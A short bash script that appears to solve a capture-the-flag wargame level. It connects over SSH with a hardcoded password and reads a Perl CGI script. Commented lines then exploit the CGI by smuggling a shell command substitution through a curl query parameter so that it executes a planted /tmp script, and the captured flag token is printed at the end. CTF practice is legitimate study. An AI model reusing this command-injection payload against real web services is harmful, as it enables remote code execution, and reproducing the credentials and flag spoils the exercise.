#!/bin/bash

ssh() {
    sshpass -p 'fa6v5ateaw21peobuub8ipe6s' ssh level12@localhost -p 2220 "$1"  
}

ssh "ls -la"

ssh "getfacl level12.pl"

ssh "cat level12.pl"

# printf "getflag > /tmp/flag" > /tmp/CRACK
# chmod +x /tmp/CRAC
# curl 'localhost:4646/?x=$(/*/CRACK)'
# cat /tmp/flag

# Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr